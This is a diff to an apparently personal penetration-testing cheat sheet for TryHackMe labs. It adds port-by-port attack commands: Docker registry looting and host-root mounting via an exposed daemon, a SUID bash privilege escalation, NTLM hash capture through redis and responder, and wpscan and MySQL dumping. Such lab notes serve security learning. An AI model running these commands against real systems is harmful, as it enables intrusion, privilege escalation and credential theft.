@@ -191,13 +191,17 @@ sudo nmap $VICTIM -p25 --script smtp-vuln*
 
 **Example**
 
-[#dns-smb-and-snmp](../walkthroughs/tryhackme/enumeration.md#dns-smb-and-snmp "mention")
+[#dns-smb-and-snmp](../walkthroughs/tryhackme/enumeration.md#dns-smb-and-snmp "mention")[#udp-53-dns](../walkthroughs/tryhackme/hip-flask.md#udp-53-dns "mention")
 
 **Kali**
 
 ```
 dig -t AXFR $HOST.thm @$DNSSERVER
 ```
+
+##
+
+##
 
 ## **TCP/80:443 - HTTP(s)**
 
@@ -585,7 +589,11 @@ python2 -m SimpleHTTPServer 81
 #### Kali
 
 ```
+HTTP
 wpscan --url http://$VICTIM
+
+HTTPS
+wpscan --url http://$VICTIM --disable-tls-checks
 ```
 
 #### Enumerate wordpress site
@@ -929,8 +937,21 @@ chmod +d /mount/point/bash
 
 ## **TCP/3306 - SQL**
 
+**examples**
+
+[#tcp-3306-mysql](../walkthroughs/tryhackme/umbrella.md#tcp-3306-mysql "mention")
+
 ```
-mysql -u $USER -h $VICTIM
+mysql -u $USER -h $VICTIM -p'$PASSWORD'
+```
+
+**Kali(mysql)**
+
+```
+show databases;
+use $DATABASE;
+show tables;
+select * from $TABLE;
 ```
 
 ## **TCP/3389 - RDP**
@@ -951,6 +972,12 @@ sudo nmap $VICTIM -p3389 --script rdp-ntlm-info
 rdesktop -u $USERNAME $VICTIM
 ```
 
+**Kali**
+
+```
+remmina
+```
+
 **Examples**
 
 [retro.md](../walkthroughs/tryhackme/retro.md "mention")[blaster.md](../walkthroughs/tryhackme/blaster.md "mention")
@@ -967,6 +994,177 @@ xfreerdp /u:$USERNAME /p:$PASSWORD /cert:ignore /v:$VICTIM /workarea  +clipboard
 xfreerdp +clipboard /u:"$USERNAME" /v:$VICTIM:3389 /size:1024x568 /smart-sizing:800x1200
 Password: $PASSWORD 
 ```
+
+## **TCP/5000 - Docker Registry**
+
+### **Add repositories**
+
+**Example**
+
+[the-great-escape.md](../walkthroughs/tryhackme/the-great-escape.md "mention")
+
+**Kali**
+
+```
+subl /etc/docker/daemon.json
+```
+
+**daemon.json**
+
+```
+{
+  "insecure-registries" : ["$VICTIM:5000"]
+}
+```
+
+**Kali**
+
+```
+sudo systemctl stop docker
+```
+
+Wait 30 seconds
+
+**Kali**
+
+```
+sudo systemctl start docker
+```
+
+
+
+### **List repositories**
+
+**Example**
+
+[the-docker-rodeo.md](../walkthroughs/tryhackme/the-docker-rodeo.md "mention")[#tcp-5000-docker-registry](../walkthroughs/tryhackme/umbrella.md#tcp-5000-docker-registry "mention")
+
+**Kali**
+
+```
+curl -s http://$VICTIM:5000/v2/_catalog
+```
+
+### **Get tags of a repository**
+
+**Example**
+
+[the-docker-rodeo.md](../walkthroughs/tryhackme/the-docker-rodeo.md "mention")[#tcp-5000-docker-registry](../walkthroughs/tryhackme/umbrella.md#tcp-5000-docker-registry "mention")
+
+**Kali**
+
+```
+curl -s http://$VICTIM:5000/v2/$REPOSITORY/tags/list
+```
+
+### **Get manifests**
+
+**Example**
+
+[the-docker-rodeo.md](../walkthroughs/tryhackme/the-docker-rodeo.md "mention")[#tcp-5000-docker-registry](../walkthroughs/tryhackme/umbrella.md#tcp-5000-docker-registry "mention")
+
+Inside the manifest we can find potential credentials
+
+**Kali**
+
+```
+curl -s http://$VICTIM:5000/v2/$REPOSITORY/manifests/latest
+```
+
+### Download the Docker image to find info
+
+**Example**
+
+[#download-the-docker-image-we-are-going-to-decompile-using](../walkthroughs/tryhackme/the-docker-rodeo.md#download-the-docker-image-we-are-going-to-decompile-using "mention")
+
+**Kali**
+
+```
+docker pull $VICTIM:5000/$REPOSITORY
+docker images
+dive $IMAGE_ID
+```
+
+### Enter image
+
+**Example**
+
+[the-great-escape.md](../walkthroughs/tryhackme/the-great-escape.md "mention")
+
+**Kali**
+
+```
+docker -H $VICTIM:5000 images
+docker -H $VICTIM:5000 run -v /:/mnt --rm -it $REPOSITORY chroot /mnt sh
+```
+
+## Uploading Malicious Docker Images
+
+**Example**
+
+[#vulnerability-3-uploading-malicious-docker-images](../walkthroughs/tryhackme/the-docker-rodeo.md#vulnerability-3-uploading-malicious-docker-images "mention")
+
+**Kali**
+
+```
+docker pull
+```
+
+**Docker file example**
+
+<figure><img src="../.gitbook/assets/image (1063).png" alt=""><figcaption></figcaption></figure>
+
+## RCE via Exposed Docker Daemon
+
+**Example**
+
+[#vulnerability-4-rce-via-exposed-docker-daemon](../walkthroughs/tryhackme/the-docker-rodeo.md#vulnerability-4-rce-via-exposed-docker-daemon "mention")
+
+## Escape via Exposed Docker Daemon
+
+**Example**
+
+[#vulnerability-5-escape-via-exposed-docker-daemon](../walkthroughs/tryhackme/the-docker-rodeo.md#vulnerability-5-escape-via-exposed-docker-daemon "mention")
+
+## Shared Namespaces
+
+**Example**
+
+[#vulnerability-6-shared-namespaces](../walkthroughs/tryhackme/the-docker-rodeo.md#vulnerability-6-shared-namespaces "mention")
+
+## Misconfigured Privileges
+
+**Example**
+
+[#vulnerability-7-misconfigured-privileges-deploy-2](../walkthroughs/tryhackme/the-docker-rodeo.md#vulnerability-7-misconfigured-privileges-deploy-2 "mention")
+
+## Privilege Escalation with 2 shells and host mount
+
+**Example**
+
+[#privilege-escalation-with-2-shells-and-host-mount](../walkthroughs/tryhackme/umbrella.md#privilege-escalation-with-2-shells-and-host-mount "mention")
+
+If you have access as **root inside a container** that has some folder from the host mounted and you have **escaped as a non privileged user to the host** and have read access over the mounted folder. You can create a **bash suid file** in the **mounted folder** inside the **container** and **execute it from the host** to privesc.
+
+**Victim(root)**
+
+```
+find / -name "$FILE-BOTH-USERS-CAN-ACCESS"
+cd /$FOLDER
+cp /bin/bash . 
+chown root:root bash
+chmod 4777 bash
+```
+
+**Victim(claire-r)**
+
+```
+find / -name "$FILE-BOTH-USERS-CAN-ACCESS"
+cd /$FOLDER-FROM-BEFORE-MIGHT-BE-DIFF-LOCATION
+./bash -p 
+```
+
+
 
 ## **TCP/5327 - Postgres**
 
@@ -1009,7 +1207,31 @@ $VICTIM:6379> GET "$VALUE"
 $VICTIM:6379> LRANGE "$VALUE" 1 100
 ```
 
+### **Get Users hash**
 
+**Example**
+
+[#tcp-139-netbios-1](../walkthroughs/tryhackme/vulnnet-active.md#tcp-139-netbios-1 "mention")
+
+**Kali(redis-cli)**
+
+```
+config get *
+```
+
+**Kali**
+
+```
+responder -I ens5 -dvw  
+```
+
+(You can write anything in place of share, the share does not need to exist)
+
+**Kali(redis-cli)**
+
+```
+eval "dofile('//$KALI/share')" 0
+```
 
 ## TCP/7070 - AnyConnect
 
@@ -1077,5 +1299,21 @@ exit
 
 
 
+
+## Knock
+
+**Example**
+
+[the-great-escape.md](../walkthroughs/tryhackme/the-great-escape.md "mention")
+
+Usually used in CTFs. Knock on certain ports in a certain pattern to open up more ports.
+
+**Kali**
+
+```
+git clone https://github.com/grongor/knock.git
+cd knock
+./knock $VICTIM 42 1337 10420 6969 63000
+```
 
 \
